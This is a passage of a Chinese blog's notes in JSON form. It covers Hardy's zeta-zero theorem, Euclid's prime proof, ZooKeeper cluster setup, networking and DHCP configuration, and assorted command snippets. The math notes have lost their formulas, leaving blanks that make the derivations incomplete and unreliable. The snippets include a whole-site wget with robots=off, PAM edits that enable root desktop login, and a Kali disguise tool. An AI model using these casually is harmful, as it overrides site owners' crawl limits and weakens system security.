所以原式"},{"title":"","date":"2025-11-09T07:22:00.000Z","updated":"2025-11-09T07:31:00.000Z","comments":true,"path":"notes/Zeta/84.html","permalink":"https://blog.mhuig.top/notes/Zeta/84","excerpt":"","text":"哈代定理 哈代定理 历史背景与问题起源19 世纪末，黎曼在《论小于给定数值的素数个数》中提出著名猜想： 黎曼 函数的所有非平凡零点均位于临界线 上。这一猜想将素数分布与复变函数零点紧密关联，但黎曼仅验证了前几个零点便戛然而止。20 世纪初，尽管阿达马（Hadamard）和冯・曼戈尔特（von Mangoldt）证明了零点有无穷多个，却未能确定其分布区域。 1914 年，英国数学家 G. H. 哈代（G. H. Hardy）取得突破性进展： 他首次证明临界线上存在无穷多个非平凡零点，这一结果被称为哈代定理。1921 年，哈代与李特尔伍德（J. E. Littlewood）进一步将结论强化为密度估计： 存在常数 ，使得当 充分大时，临界线上 内的零点个数 。这一结果不仅为黎曼猜想提供了实质性支持，更开创了通过复分析技巧研究零点分布的范式。 核心概念与数学基础黎曼 函数与 Xi 函数黎曼 函数 的非平凡零点关于临界线对称，故仅需研究 的情形。为简化分析，哈代引入 Xi 函数 ： 该函数满足 ，且其实部在临界线 上为实值偶函数 。因此， 在临界线上的零点等价于 的实零点。 关键积分表示哈代的证明依赖于 的积分变换。定义 通过 Jacobi theta 函数的变换公式，可将其与模形式 关联： 其中 满足函数方程 。这一关系揭示了 的零点分布与模形式衰减性的深层联系。 哈代定理的详细推导（1914 年版本）反证法框架哈代采用反证法： 假设 在 时不变号（不妨设非负），则可推导出 的高阶导数矛盾。 高阶导数分析对 求 阶导数： 当 时，右侧第二项因 的快速衰减趋于零，故 若 最终非负，则左侧积分在 时收敛。但通过估计积分尾项发现： 这与右侧的指数衰减（ ）矛盾，从而证明 必须无穷次变号，即有无穷多个零点。 哈代 - 李特尔伍德密度定理（1921 年强化）多区间零点探测哈代与李特尔伍德引入滑动区间积分： 对固定 ，定义 若 ，则 内必有零点。通过覆盖区间 并估计无零点区间的测度，可将零点个数下界转化为测度估计问题。 Fourier 变换与 L² 范数估计利用 Parseval 定理， 的 L² 范数可通过其 Fourier 变换控制： 结合 的渐近性质与 Dirichlet 多项式的二次均值估计，最终得到无零点区间的测度 ，从而推出 取 为常数即得 。 定理意义与后续发展哈代零点定理首次将模形式、积分变换与复分析技巧结合，为后续塞尔伯格（Selberg）、莱文森（Levinson）等人的工作奠定基础。 哈代 - 李特尔伍德的 表明临界线上的零点正密度存在，暗示黎曼猜想可能成立。 其思想被推广至数论、调和分析等领域，例如用于证明 Hardy 不确定性原理 (一个函数与其 Fourier 变换不能同时指数衰减)。 后续研究中，塞尔伯格（1942）证明临界线上零点比例为正，莱文森（1974）将比例改进至 ，康瑞（Conrey, 1989）进一步提升至 。尽管距离黎曼猜想的完全解决仍有距离，但哈代的开创性工作已成为人类探索数学极限的典范。"},{"title":"","date":"2025-09-14T23:51:00.000Z","updated":"2025-09-15T00:00:00.000Z","comments":true,"path":"notes/Zeta/9.html","permalink":"https://blog.mhuig.top/notes/Zeta/9","excerpt":"","text":"Euclid 素数无限定理 Euclid 素数无限定理 目前有文献记载的最古老的素数无限证明源自古希腊数学家 Euclid 的数学名著《几何原本》。这一定理是《几何原本》中第九卷的命题 20。 Book 9 Proposition 20 Prime numbers are more than any assigned multitude of prime numbers. Euclid Euclid 手稿由君士坦丁堡帕特雷的阿雷萨斯书记员斯蒂芬于公元 888 年抄写。它保存在牛津大学博德利图书馆。 希腊语Οἱ πρῶτοι ἀριθμοὶ πλείους εἰσὶ παντὸς τοῦ προτεθέντος πλήθους πρώτων ἀριθμῶν. Ἔστωσαν οἱ προτεθέντες πρῶτοι ἀριθμοὶ οἱ Α, Β, Γ: λέγω, ὅτι τῶν Α, Β, Γ πλείους εἰσὶ πρῶτοι ἀριθμοί. Εἰλήφθω γὰρ ὁ ὑπὸ τῶν Α, Β, Γ ἐλάχιστος μετρούμενος καὶ ἔστω ὁ ΔΕ, καὶ προσκείσθω τῷ ΔΕ μονὰς ἡ ΔΖ. ὁ δὴ ΕΖ ἤτοι πρῶτός ἐστιν ἢ οὔ. ἔστω πρότερον πρῶτος: εὑρημένοι ἄρα εἰσὶ πρῶτοι ἀριθμοὶ οἱ Α, Β, Γ, ΕΖ πλείους τῶν Α, Β, Γ. Ἀλλὰ δὴ μὴ ἔστω ὁ ΕΖ πρῶτος: ὑπὸ πρώτου ἄρα τινὸς ἀριθμοῦ μετρεῖται. μετρείσθω ὑπὸ πρώτου τοῦ Η: λέγω, ὅτι ὁ Η οὐδενὶ τῶν Α, Β, Γ ἐστιν ὁ αὐτός. εἰ γὰρ δυνατόν, ἔστω. οἱ δὲ Α, Β, Γ τὸν ΔΕ μετροῦσιν: καὶ ὁ Η ἄρα τὸν ΔΕ μετρήσει. μετρεῖ δὲ καὶ τὸν ΕΖ: καὶ λοιπὴν τὴν ΔΖ μονάδα μετρήσει ὁ Η ἀριθμὸς ὤν: ὅπερ ἄτοπον. οὐκ ἄρα ὁ Η ἑνὶ τῶν Α, Β, Γ ἐστιν ὁ αὐτός. καὶ ὑπόκειται πρῶτος. εὑρημένοι ἄρα εἰσὶ πρῶτοι ἀριθμοὶ πλείους τοῦ προτεθέντος πλήθους τῶν Α, Β, Γ οἱ Α, Β, Γ, Η: ὅπερ ἔδει δεῖξαι. 英语Prime numbers are more than any assigned multitude of prime numbers. Let A, B, C be the assigned prime numbers; I say that there are more prime numbers than A, B, C. For let the least number measured by A, B, C be taken, and let it be DE; let the unit DF be added to DE. Then EF is either prime or not. First, let it be prime; then the prime numbers A, B, C, EF have been found which are more than A, B, C. Next, let EF not be prime; therefore it is measured by some prime number. Let it be measured by the prime number G. I say that G is not the same with any of the numbers A, B, C. For, if possible, let it be so. Now A, B, C measure DE; therefore G also will measure DE. But it also measures EF. Therefore G, being a number, will measure the remainder, the unit DF: which is absurd. Therefore G is not the same with any one of the numbers A, B, C. And by hypothesis it is prime. 中文质数的数量多于任何指定的质数的个数。设 A、B、C 为指定的质数；我断言质数的数量比 A、B、C 多。因为取 A、B、C 能量尽的最小数，设为 DE；在 DE 上加上单位 DF。那么 EF 要么是质数，要么不是。首先，设 EF 是质数；那么质数 A、B、C、EF 已被找到，且多于 A、B、C。其次，设 EF 不是质数；那么它能被某个质数量尽。设它能被质数 G 量尽。我断言 G 与 A、B、C 中的任何一个都不相同。因为，若有可能，设 G 与它们中的某一个相同。现在 A、B、C 能量尽 DE；所以 G 也能量尽 DE。但它也能量尽 EF。所以 G，作为一个数，将能量尽余数，即单位 DF：这是荒谬的。所以 G 与 A、B、C 中的任何一个都不相同。并且根据假设它是质数。 现代数学语言首先假设存在有限的素数集合，用 表示， 其中 是集合里最大的素数。 然后我们可以定义 是素数并且大于 ， 很明显 不能被 $2,3,\\cdots,p\\$ 整除。 因此， 不能被任何素数整除， 所以它是一个素数并且大于 。 所以 不是一组完整的素数， 故而出现矛盾。 因此，“素数有有限个” 这一假设应被否定。 注意此证明并不说明 个素数的乘积与 的和是素数。 例如,"},{"title":"","date":"2025-09-14T02:55:00.000Z","updated":"2025-09-14T03:47:00.000Z","comments":true,"path":"notes/Zeta/index.html","permalink":"https://blog.mhuig.top/notes/Zeta/","excerpt":"","text":"Zeta Archive Zeta Archive .prev-next{ display: none !important; }"},{"title":"","date":"2019-09-19T03:25:00.000Z","updated":"2022-05-11T05:34:00.000Z","comments":true,"path":"notes/Zookeeper/apache.html","permalink":"https://blog.mhuig.top/notes/Zookeeper/apache","excerpt":"","text":"Apache 集群环境搭建 大数据处理技术 - Zookeeper 的 Apache 集群环境搭建 Zookeeper 的集群环境搭建 服务器 IP 主机名 myid 的值 192.168.52.100 node01 1 192.168.52.110 node02 2 192.168.52.120 node03 3 下载下载 Zookeeeper 的压缩包，下载网址如下 http://archive.apache.org/dist/zookeeper/ 我们在这个网址下载我们使用的 zk 版本为 3.4.9下载完成之后，上传到我们的 linux 的 /export/softwares 路径下准备进行安装 解压解压 zookeeper 的压缩包到 /export/servers 路径下去，然后准备进行安装 cd /export/softwarestar -zxvf zookeeper-3.4.9.tar.gz -C ../servers/ 修改配置文件第一台机器修改配置文件 cd /export/servers/zookeeper-3.4.9/conf/ cp zoo_sample.cfg zoo.cfg mkdir -p /export/servers/zookeeper-3.4.9/zkdatas/ vim zoo.cfg zoo.cfgdataDir=/export/servers/zookeeper-3.4.9/zkdatasautopurge.snapRetainCount=3autopurge.purgeInterval=1server.1=node01:2889:3889server.2=node02:2889:3889server.3=node03:2889:3889 autopurge.snapRetainCount 这个参数指定了需要保留的文件数目。默认是保留 3 个。 autopurge.purgeInterval ZK 提供了自动清理事务日志和快照文件的功能，这个参数指定了清理频率，单位是小时，需要配置一个 1 或更大的整数，默认是 0 ，表示不开启自动清理功能。server 后的数字是选举 id，在选举过程中会用到。注意: 数字一定要能比较出大小。2888 端口 原子广播端口，可以自定义3888 端口 选举端口，leader 会通过原子广播端口广播给其他节点，并收集每台服务器反馈信息。 添加 myid 配置在第一台机器的 /export/servers/zookeeper-3.4.9/zkdatas/ 这个路径下创建一个文件，文件名为 myid ,文件内容为 1 echo 1 &gt; /export/servers/zookeeper-3.4.9/zkdatas/myid 安装包分发并修改 myid 的值安装包分发到其他机器 第一台机器上面执行以下两个命令 scp -r /export/servers/zookeeper-3.4.9/ node02:/export/servers/scp -r /export/servers/zookeeper-3.4.9/ node03:/export/servers/ 第二台机器上修改 myid 的值为 2 echo 2 &gt; /export/servers/zookeeper-3.4.9/zkdatas/myid 第三台机器上修改 myid 的值为 3 echo 3 &gt; /export/servers/zookeeper-3.4.9/zkdatas/myid 三台机器启动 Zookeeper 服务三台机器启动 Zookeeper 服务这个命令三台机器都要执行 /export/servers/zookeeper-3.4.9/bin/zkServer.sh start 查看启动状态 /export/servers/zookeeper-3.4.9/bin/zkServer.sh status"},{"title":"","date":"2019-09-19T03:25:00.000Z","updated":"2022-05-11T09:43:00.000Z","comments":true,"path":"notes/Zookeeper/cdh.html","permalink":"https://blog.mhuig.top/notes/Zookeeper/cdh","excerpt":"","text":"CDH 集群环境搭建 大数据处理技术 - CDH 版本的 zookeeper 环境搭建 下载第一步：下载 zookeeeper 的压缩包，下载地址为：http://archive.cloudera.com/cdh5/cdh/5/我们这里也下载对应版本的 CDH5.14.0 这个版本的 zookeeper 的压缩包即可下载完成之后，上传到我们的 linux 的 /export/softwares 路径下准备进行安装 解压解压 zookeeper 的压缩包到 /export/servers 路径下去，然后准备进行安装 cd /export/softwarestar -zxvf zookeeper-3.4.5-cdh5.14.0.tar.gz -C ../servers/ 修改配置文件node01 修改配置文件创建 zk 数据存放目录 mkdir -p /export/servers/zookeeper-3.4.5-cdh5.14.0/zkdatas 修改 zk 配置文件 cd /export/servers/zookeeper-3.4.5-cdh5.14.0/confcp zoo_sample.cfg zoo.cfgvim zoo.cfg zoo.cfgdataDir=/export/servers/zookeeper-3.4.5-cdh5.14.0/zkdatasautopurge.snapRetainCount=3autopurge.purgeInterval=1server.1=node01:2888:3888server.2=node02:2888:3888server.3=node03:2888:3888 创建 myid 文件并写入内容 echo 1 &gt; /export/servers/zookeeper-3.4.5-cdh5.14.0/zkdatas/myid 将安装包分发到其他机器node01 执行以下命令 cd /export/serversscp -r zookeeper-3.4.5-cdh5.14.0/ node02:$PWDscp -r zookeeper-3.4.5-cdh5.14.0/ node03:$PWD node02 修改配置文件node02 执行以下命令创建 myid 文件并赋值 echo 2 &gt; /export/servers/zookeeper-3.4.5-cdh5.14.0/zkdatas/myid node03 修改配置文件node03 执行以下命令创建 myid 文件并赋值 echo 3 &gt; /export/servers/zookeeper-3.4.5-cdh5.14.0/zkdatas/myid 启动 zk 服务三台服务器启动 zookeeper，三台机器都执行以下命令启动 zookeeper cd /export/servers/zookeeper-3.4.5-cdh5.14.0bin/zkServer.sh start"},{"title":"","date":"2022-05-10T06:21:00.000Z","updated":"2022-05-10T06:21:00.000Z","comments":true,"path":"notes/Zookeeper/index.html","permalink":"https://blog.mhuig.top/notes/Zookeeper/","excerpt":"","text":".fa-secondary{opacity:.4} Zookeeper Zookeeper .prev-next{ display: none !important; }"},{"title":"","date":"2019-09-19T03:25:00.000Z","updated":"2022-05-10T06:31:00.000Z","comments":true,"path":"notes/Zookeeper/distributed-cluster.html","permalink":"https://blog.mhuig.top/notes/Zookeeper/distributed-cluster","excerpt":"","text":"分布式集群 大数据处理技术 - 分布式集群 集群多个节点干相同的事情；举例：滥竽充数每个人划桨，干的都是一样的活儿，叫做集群。 分布式的每一个节点也可以做成集群。其实这个赛龙舟的图，总整体来看属于分布式，包括打鼓和划桨两个分布式节点，而划桨的节点又是集群的形态。现实生活中例子还很多，例如，这张现代乐队的图就属于集群 高可用！ 分布式多个节点协同完成一件事情，每个节点干不同的事情。区别： 相同点：都有多个节点 不同点：集群干的活儿一样，分布式干的活儿不一样"},{"title":"","date":"2019-09-19T03:25:00.000Z","updated":"2022-05-11T05:34:00.000Z","comments":true,"path":"notes/Zookeeper/overview.html","permalink":"https://blog.mhuig.top/notes/Zookeeper/overview","excerpt":"","text":"Overview 大数据处理技术 - zookeeper 的介绍 ZooKeeper 概述Zookeeper 是一个分布式协调服务的开源框架。 主要用来解决分布式集群中应用系统的一致性问题，例如怎样避免同时操作同一数据造成脏读的问题。ZooKeeper 本质上是一个分布式的小文件存储系统。 提供基于类似于文件系统的目录树方式的数据存储，并且可以对树中的节点进行有效管理。从而用来维护和监控你存储的数据的状态变化。通过监控这些数据状态的变化，从而可以达到基于数据的集群管理。诸如： 统一命名服务 (dubbo)、分布式配置管理 (solr 的配置集中管理)、分布式消息队列（sub / pub）、分布式锁、分布式协调等功能。 Zookeeper 的架构 LeaderZookeeper 集群工作的核心 事务请求（写操作） 的唯一调度和处理者，保证集群事务处理的顺序性；集群内部各个服务器的调度者。对于 create， setData， delete 等有写操作的请求，则需要统一转发给 leader 处理， leader 需要决定编号、执行操作，这个过程称为一个事务。 Follower处理客户端非事务（读操作） 请求，转发事务请求给 Leader；参与集群 Leader 选举投票 2n-1 台可以做集群投票。此外，针对访问量比较大的 zookeeper 集群， 还可新增观察者角色。 Observer观察者角色，观察 Zookeeper 集群的最新状态变化并将这些状态同步过来，其对于非事务请求可以进行独立处理，对于事务请求，则会转发给 Leader 服务器进行处理。不会参与任何形式的投票只提供非事务服务，通常用于在不影响集群事务处理能力的前提下提升集群的非事务处理能力。扯淡：说白了就是增加并发的读请求 Zookeeper 的特性全局数据一致每个 server 保存一份相同的数据副本， client 无论连接到哪个 server，展示的数据都是一致的，这是最重要的特征； 可靠性如果消息被其中一台服务器接受，那么将被所有的服务器接受。 顺序性包括全局有序和偏序两种：全局有序是指如果在一台服务器上消息 a 在消息 b 前发布，则在所有 Server 上消息 a 都将在消息 b 前被发布；偏序是指如果一个消息 b 在消息 a 后被同一个发送者发布， a 必将排在 b 前面。 数据更新原子性一次数据更新要么成功（半数以上节点成功），要么失败，不存在中间状态； 实时性Zookeeper 保证客户端将在一个时间间隔范围内获得服务器的更新信息，或者服务器失效的信息。 Zookeeper 的集群环境为什么搭建 zookeeper 集群 集群有高可用的能力。 高并发的情况下，单机版性能低下 Zookeeper 选举策略Zookeeper 集群搭建指的是 ZooKeeper 分布式模式安装。 通常由 2n + 1 台 servers 组成。 这是因为为了保证 Leader 选举（基于 Paxos 算法的实现） 能过得到多数的支持，所以 ZooKeeper 集群的数量一般为奇数。Zookeeper 运行需要 java 环境， 所以需要提前安装 jdk。 对于安装 leader + follower 模式的集群， 大致过程如下： 配置主机名称到 IP 地址映射配置 修改 ZooKeeper 配置文件 远程复制分发安装文件 设置 myid 启动 ZooKeeper 集群 如果要想使用 Observer 模式，可在对应节点的配置文件添加如下配置： peerType = observer 其次，必须在配置文件指定哪些节点被指定为 Observer，如： server.1:localhost:2181:3181:observer"},{"title":"","date":"2023-12-03T05:47:00.000Z","updated":"2023-12-03T05:47:00.000Z","comments":true,"path":"notes/datacom/1.html","permalink":"https://blog.mhuig.top/notes/datacom/1","excerpt":"","text":"网络通信 网络通信 网络通信基本概念通信: 是指人与人, 人与物, 物与物之间通过某种媒介和行为进行的信息传递与交流. 网络: 由各种终端, 传输介质, 网络设备所构成的资源共享的系统. 网络通信: 通过网络进行通信. 数据载荷: 最终想要传递的用户数据. 报文: 网络中交换与传输的数据单元. 头部: 数据载荷前所添加的信息. 尾部: 数据载荷后所添加的信息. 封装: 对数据载荷添加头部或者尾部的过程. 解封装: 对报文拆除头部或者尾部的过程. 网络设备交换机 (Switch): 是距离终端用户最近的设备, 将大量的终端设备接入到网络中. 交换机拥有大量的端口. 路由器 (Router): 用于连接不同的网络, 并且指导数据包选择最优路径转发. 防火墙 (Fire Wall): 安全设备, 用于控制两个网络之间的安全通信, 可以监测、限制或者更改网络数据流量, 尽可能的屏蔽外部信息, 一次实现对网络的安全防护. 无线设备: AP(无线接入点) 胖 AP: 可以对 AP 设备单独进行改动, 适用于小型企业网, 家庭网络 瘦 AP: 适用于大中型网络, 通过 AC 对所有 AP 进行修改 AC(无线控制器): 用于对 AP 的管理, 对 AP 集中控制 网关: 定义是一个网络设备, 是网络的出口. 网络的分类地理覆盖范围分类 a. 局域网: 一般由地理位置较近的网络构建 (公司网络, 学校网络, 网吧, 家庭网络) b. 城域网: 在一个城市所建立的计算机网络 (宽带城域网, 市级或省级的电子政务专网) c. 广域网: 覆盖范围广, 可以连接多个城市或国家 (因特网) 根据网络拓扑类型进行分类网络拓扑: 将真实的物理网络逻辑表现出来, 方便管理员更直观的了解网络结构. a. 星型网络: 所有节点通过一个中心节点相连 i. 优点: 增加新节点比较容易, 无需更改原来的拓扑结构, 数据通信必须经过中心节点易于监控, 没有环路产生 ii. 缺点: 容易造成单点故障, 中心节点故障会影响整个网络 b. 总线型网络: 所有节点通过一条总线连接在一起 i. 优点: 增加新节点比较容易, 某一节点故障不会影响到其他节点 ii. 缺点: 一旦总线发生故障, 会影响到整个网络, 任意一个节点都能够监听网络中的数据, 造成安全隐患. c. 环形网络: 所有的网络首尾相连形成封闭环路. i. 优点: 冗余性高, 网络可靠 ii. 缺点: 增加新的节点时, 需要打破环形结构, 导致网络中断. d. 树状网络: 层次化的星型结构, 将多个星型拓扑连接在一起 i. 优点: 能够快速的将多个星型拓扑连接在一起易于扩充, 避免单点故障问题, 某一分支节点故障不会影响其他分支节点 ii. 缺点: 层次越高的节点故障导致网络出现的问题越严重. e. 全网状网络: 任意两个节点之间都通过线缆相连 i. 优点: 冗余性高, 可靠性高 ii. 缺点: 每个节点占用大量的端口, 需要大量的线缆, 导致成本增加, 不易扩展 f. 部分网状拓扑: 只将关键节点两两互联 i. 优点: 在保证一定可靠性的基础上降低成本 ii. 缺点: 部分链路通讯效率降低. g. 组合型网络: 将各种网络进行组合, 从而形成现有的网络结构. 根据成本通信效率, 可靠性等具体需求采用多种拓扑形态组合的方法."},{"title":"杂记片段","date":"2022-06-29T01:37:00.000Z","updated":"2022-08-24T05:31:00.000Z","comments":true,"path":"notes/code/index.html","permalink":"https://blog.mhuig.top/notes/code/","excerpt":"","text":"conda 创建环境 conda create --name &lt;你的环境名字&gt; python=&lt;你需要的 python 环境名称&gt;例子：conda create --name py37 python=3.7 requirements.txt pip 批量导出包含环境中所有组件的 requirements.txt 文件pip freeze &gt; requirements.txtpip 批量安装 requirements.txt 文件中包含的组件依赖pip install -r requirements.txtconda 批量导出包含环境中所有组件的 requirements.txt 文件conda list -e &gt; requirements.txtconda 批量安装 requirements.txt 文件中包含的组件依赖conda install --yes --file requirements.txt 清除 package 缓存 清除 npm 缓存 npm cache verifynpm cache cleannpm cache clean --forcenpm cache winC:/Users/xxxxx/AppData/Local/npm-cacheYarn cache winC:/Users/xxxxx/AppData/Local/Yarn/Cache 清除 pip 缓存 linuxrm -rf ~/.cache/pip/*winC:/Users/xxxxx/AppData/Local/pip/cache 清除 conda 缓存 conda clean -p //删除没有用的包conda clean -t //tar打包conda clean -a //删除所有的安装包及cache postgresql 导出整个数据库 pg_dump -h hostname -U username -p port -W -d databasename --inserts &gt; bak.sql 导入整个数据库 pg_restore -h hostname -U username -p port -W -d databasename -v \"/bak.sql\" wget 抓取全站 wget -r -p -np -k -e robots=off http://www.baidu.com/ Linux Ubuntu 桌面版使用 ROOT 用户登录 sudo passwd rootsudo nano /etc/pam.d/gdm-autologin# 注释'auth requied pam_succeed_if.so user != root quiet success'这一行,保存退出sudo nano /etc/pam.d/gdm-password# 注释'auth requied pam_succeed_if.so user != root quiet success'这一行,保存退出sudo nano /root/.profile# 在'mesg n 2&gt; /dev/null || true'这一行前添加'tty -s &amp;&amp; ', 即这一行改为'tty -s &amp;&amp; mesg n 2&gt; /dev/null || true' kali 伪装为 windows10 kali-undercover"},{"title":"","date":"2025-09-14T05:34:00.000Z","updated":"2025-09-14T05:42:00.000Z","comments":true,"path":"notes/Zeta/8.html","permalink":"https://blog.mhuig.top/notes/Zeta/8","excerpt":"","text":"Riemann’s Zeta Function Riemann’s Zeta Function"},{"title":"","date":"2023-12-13T07:07:00.000Z","updated":"2023-12-13T07:07:00.000Z","comments":true,"path":"notes/datacom/10.html","permalink":"https://blog.mhuig.top/notes/datacom/10","excerpt":"","text":"DHCP DHCP DHCPDHCP: 动态主机配置协议, 可以在网络为终端设备配置上网参数 (IP 地址, 掩码, 网关, DNS 等等),可以减少管理员的工作量. 应用层协议. DHCP 工作原理DHCP 采用 C/S 架构 (客户端 / 服务端) 路由器, 三层交换机, 防火墙, AC. DHCP Server 的 IP 地址需要管理员手工配置. DHCP 报文DHCP Discover: 用于发现网络中的 DHCP 服务器. DHCP offer: 用于提供终端设备的上网参数. DHCP Request: 客户端请求配置确认, 或续借租期. DHCP ACK: 服务器对 DHCP Request 进行确认回复. DHCP NAK: 服务器对 DHCP Request 进行拒绝. DHCP Release: 客户端要释放地址时通知 DHCP 服务器的报文. DHCP Decline: 当客户端发现服务器分配的地址发现冲突, 会通过此报文通知 DHCP 服务器, 并重新向服务器申请地址. DHCP 工作过程PC Server=== Discover(广播) ==&gt;&lt;== Offer(单播/广播) ====== Request (广播) ==&gt;&lt;== ACK/NAK(单播/广播) === 当一个刚接入网络的终端设备还没分配 IP 地址 (0.0.0.0 / 32) 的时候, 会通过广播来发送 DHCP Discover 报文来寻找网络中的服务器. 当网络内存在多台 DHCP 服务器接收到客户端发来的 Discover, 会从尚未分配的 IP 地址中选一个分配给设备, 然后通过单播形式发送 offer 报文给终端设备, 该报文中包含上网参数信息. 终端设备收到了 DHCP 服务器发来的 DHCP offer 报文, 选择优先到达的一个. 随后广播一个 Request 报文, 目的是告诉所有的 DHCP 服务器, 自己将使用哪一个 DHCP 服务器所提供的地址, 以便于其他的服务器撤销自己的 offer 报文. DHCP 服务器收到终端设备发来的 DHCP Request, 返回给客户端一个 ACK, 表示确认, 并将参数信息放入到报文中发送给终端设备. 当终端设备收到 DHCP 服务器发来的 ACK 后, 会向网络内发送一个免费 ARP 来确认网络内是否存在地址冲突, 如果没有冲突, 则使用该地址, 如果发生冲突, 则向 DHCP 服务器发送一个 Decline 报文, 拒绝此 IP 地址, 并向服务器重新申请地址. DHCP 客户端在确定不使用 IP 地址信息时会发送 Release 消息来释放当前地址. 系统关机或重启 重置网卡 管理员通过命令手工释放 ipconfig /renew // 重新向DHCP服务器申请上网参数ipconfig /release // 释放当前PC的上网参数 DHCP Discover 消息的目的地址通常是广播地址 (Broadcast Address). 广播地址是一个特殊的 IP 地址，用于将消息发送到网络中的所有设备. 在 IPv4 网络中，广播地址通常是目标 IP 地址为 255.255.255.255 的消息. DHCP 续租过程1. 当客户端的租期到达 50% 时会主动发送一个单播的 Request 进行 DHCP 续租. 2. 如果 Server 检查 Request 消息没有任何问题, 直接回复 ACK 确认, 并刷新租期. 3. 如果 50% 没有回应, 会继续使用该 IP 地址, 直到租期的 87.5%, 客户端广播发送 Request 进行续租, 如果有 DHCP Server 回应可以进行续租, 如果没有回应, 将地址租期结束后重新进行租借过程. DHCP 全局地址池&lt;Huawei&gt;&lt;Huawei&gt;&lt;Huawei&gt;syEnter system view, return user view with Ctrl+Z.[Huawei]sy R1[R1]dhcp enable Info: The operation may take a few seconds. Please wait for a moment.done.[R1]ip pool ? STRING&lt;1-64&gt; Pool name[R1]ip pool PCInfo: It's successful to create an IP address pool.[R1-ip-pool-PC]network ? IP_ADDR&lt;X.X.X.X&gt; IP address[R1-ip-pool-PC]network 192.168.1.0 mask 24[R1-ip-pool-PC]display this[V200R003C00]#ip pool PC network 192.168.1.0 mask 255.255.255.0 #return[R1-ip-pool-PC]q[R1]int g0/0/0[R1-GigabitEthernet0/0/0]ip address 192.168.1.254 24Dec 19 2023 09:50:57-08:00 R1 %%01IFNET/4/LINK_STATE(l)[1]:The line protocol IP on the interface GigabitEthernet0/0/0 has entered the UP state. [R1-GigabitEthernet0/0/0]display this[V200R003C00]#interface GigabitEthernet0/0/0 ip address 192.168.1.254 255.255.255.0 #return[R1-GigabitEthernet0/0/0]ip pool PC[R1-ip-pool-PC]ga [R1-ip-pool-PC]gateway-list ? IP_ADDR&lt;X.X.X.X&gt; Gateway's IP address[R1-ip-pool-PC]gateway-list 192.168.1.254[R1-ip-pool-PC]dns-list ? IP_ADDR&lt;X.X.X.X&gt; IP address[R1-ip-pool-PC]dns-list 114.114.114.114[R1-ip-pool-PC]dis th[V200R003C00]#ip pool PC gateway-list 192.168.1.254 network 192.168.1.0 mask 255.255.255.0 dns-list 114.114.114.114 #return[R1-ip-pool-PC]lease day 0 hour 0 minute 30[R1-ip-pool-PC]dis this [V200R003C00]#ip pool PC gateway-list 192.168.1.254 network 192.168.1.0 mask 255.255.255.0 lease day 0 hour 0 minute 30 dns-list 114.114.114.114 #return[R1-ip-pool-PC]q[R1]int g0/0/0[R1-GigabitEthernet0/0/0]dhcp select global &lt;Huawei&gt;system-view[Huawei]sysname R1[R1]dhcp enable // 开启 DHCP 功能[R1]ip pool PC // 创建地址池[R1-ip-pool-PC]gateway-list 192.168.1.254 // 设置网关[R1-ip-pool-PC]network 192.168.1.0 mask 255.255.255.0 // 设置地址范围[R1-ip-pool-PC]lease day 0 hour 0 minute 30 // 设置租期[R1-ip-pool-PC]dns-list 114.114.114.114 // 设置DNS地址[R1-ip-pool-PC]excluded-ip-address 192.168.1.200 192.168.1.253 // 排除地址池中的地址[R1-ip-pool-PC]static-bind ip-address IP地址 mac-address xxxx-xxxx-xxxx(mac地址) // 静态绑定某个主机使用某个IP地址[R1]interface GigabitEthernet0/0/0 // 进入接口视图[R1-GigabitEthernet0/0/0]ip address 192.168.1.254 255.255.255.0 // 配置 IP 地址[R1-GigabitEthernet0/0/0]dhcp select global // 接口下使能全局地址池 [R1]display current-configuration // 查看配置 DHCP 接口地址池&lt;Huawei&gt;syEnter system view, return user view with Ctrl+Z.[Huawei]sy R1[R1]int g0/0/0[R1-GigabitEthernet0/0/0]ip add 192.168.1.254 24[R1-GigabitEthernet0/0/0]Dec 19 2023 11:00:18-08:00 R1 %%01IFNET/4/LINK_STATE(l)[0]:The line protocol IP on the interface GigabitEthernet0/0/0 has entered the UP state. [R1-GigabitEthernet0/0/0]q[R1]dhcp enableInfo: The operation may take a few seconds. Please wait for a moment.done.[R1]int g0/0/0[R1-GigabitEthernet0/0/0]dhcp select interface [R1-GigabitEthernet0/0/0]dis th[V200R003C00]#interface GigabitEthernet0/0/0 ip address 192.168.1.254 255.255.255.0 dhcp select interface#return[R1-GigabitEthernet0/0/0]dhcp server dns-list 114.114.114.114[R1-GigabitEthernet0/0/0]dhcp server lease day 0 hour 0 min 30&lt;R1&gt;syEnter system view, return user view with Ctrl+Z.[R1]int g0/0/0[R1-GigabitEthernet0/0/0]dhcp server ? dns-list Configure DNS servers domain-name Configure domain name excluded-ip-address Mark disable IP addresses import Imports the following network configuration parameters from a central server into local ip pool database: domain name, dns server and netbios server. lease Configure the lease of the IP pool nbns-list Configure the windows's netbios name servers netbios-type Netbios node type next-server The address of the server to use in the next step of the client's bootstrap process. option Configure the DHCP options option121 DHCP option 121 option184 DHCP option 184 recycle Recycle IP address static-bind Static bind[R1-GigabitEthernet0/0/0]dhcp server st [R1-GigabitEthernet0/0/0]dhcp server static-bind ? ip-address IP address for static bind[R1-GigabitEthernet0/0/0]dhcp server static-bind ip-address 192.168.1.51 ? mac-address MAC address for static bind[R1-GigabitEthernet0/0/0]dhcp server static-bind ip-address 192.168.1.51 mac-address ? MAC_ADDR&lt;XXXX-XXXX-XXXX&gt; MAC address[R1-GigabitEthernet0/0/0]dhcp server static-bind ip-address 192.168.1.51 mac-address 5489-981A-18A3[R1-GigabitEthernet0/0/0] &lt;Huawei&gt;sy[Huawei]sy R1[R1]dhcp enable // 开启 DHCP 功能[R1]int g0/0/0 // 进入接口视图[R1-GigabitEthernet0/0/0]ip add 192.168.1.254 24 // 配置 IP 地址的掩码[R1-GigabitEthernet0/0/0]dhcp select interface // 接口下使能接口地址池[R1-GigabitEthernet0/0/0]dhcp server dns-list 114.114.114.114 // 设置 DNS[R1-GigabitEthernet0/0/0]dhcp server lease day 0 hour 0 min 30 // 设置租期[R1-GigabitEthernet0/0/0]dhcp server excluded-ip-address 192.168.1.10 192.168.1.50 // 排除地址池中的地址 [R1-GigabitEthernet0/0/0]dhcp server static-bind ip-address 192.168.1.51 mac-address 5489-981A-18A3 // 静态绑定某个主机使用某个IP地址 DHCP 中继PC 的 DHCP 广播报文单播发给 DHCP 服务器. R1&lt;Huawei&gt;syEnter system view, return user view with Ctrl+Z.[Huawei]sy R1[R1]int g0/0/1[R1-GigabitEthernet0/0/1]ip add 192.168.1.254 24[R1-GigabitEthernet0/0/1]int g0/0/0[R1-GigabitEthernet0/0/0]ip add 12.1.1.1 24[R1-GigabitEthernet0/0/0][R1]dhcp enable Info: The operation may take 